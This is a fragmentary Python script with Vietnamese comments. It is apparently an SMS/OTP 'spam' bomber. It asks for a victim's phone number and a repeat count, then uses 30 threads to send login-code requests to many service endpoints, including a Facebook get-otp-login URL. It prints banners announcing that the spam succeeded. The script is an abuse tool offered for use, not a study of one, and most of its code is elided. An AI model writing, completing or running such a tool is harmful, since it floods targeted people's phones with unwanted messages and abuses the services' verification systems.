...
def tv360(phone):
  ...
  rq = requests.post("https://m.facebook.com/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
...
# Banner hiển thị với khung ô vuông
def banner():
    print(f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════╗
{Fore.YELLOW}║ {Fore.MAGENTA}██╗░░██╗██╗░░░░░████████╗░█████╗░░█████╗░██╗░░░░░ {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.YELLOW}██║░██╔╝██║░░░░░╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░ {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.WHITE}█████═╝░██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░ {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.CYAN}██╔═██╗░██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░ {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.GREEN}██║░╚██╗███████╗░░░██║░░░╚█████╔╝╚█████╔╝███████╗ {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.RED}╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝ {Fore.YELLOW}║
{Fore.YELLOW}╚══════════════════════════════════════════════════════╝
{Fore.YELLOW}╔══════════════════════════════════════════════════════╗
{Fore.YELLOW}║ {Fore.CYAN}Liên hệ: Zalo 0362029845 | Email:              {Fore.YELLOW}
{Fore.YELLOW}╚══════════════════════════════════════════════════════╝
""")
...
functions = [ tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu,
...
# Hàm chính thực hiện spam
def run(phone, i):
    print(f"{Fore.GREEN}DÃ BẮT ĐẦU SPAM!")  # Thông báo khi bắt đầu mỗi lần spam
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        ...
        for future in concurrent.futures.as_completed(futures):
            try:
                ...
                print(f"Lỗi: {exc}")
    print(f"{Fore.YELLOW}Spam lần {i} hoàn tất.\n")

# Hiệu ứng hiển thị "Spam Thành Công"
def spam_blink(count):
    print(f"{Fore.GREEN}Đã Bắt Đầu Spam!")  # Hiển thị sau khi nhập số lần
    for _ in range(3):
        print(f"{random.choice(colors)}SPAM THÀNH CÔNG {count} LẦN!{reset}")
        time.sleep(0.5)
...
if __name__ == "__main__":
    ...
    # Nhập số điện thoại
    while True:
        phone = input(f"{Fore.YELLOW}SỐ ĐIỆN THOẠI: ")
    ...
    while True:
        try:
            count = int(input(f"{Fore.YELLOW}SỐ LẦN: "))
            if is_valid_count(count):
                break
        except ValueError:
            print(f"{Fore.RED}Số lần không hợp lệ.")

    # Thông báo đã bắt đầu spam
    print(f"{Fore.GREEN}Đã bắt đầu spam, vui lòng đợi...\n")
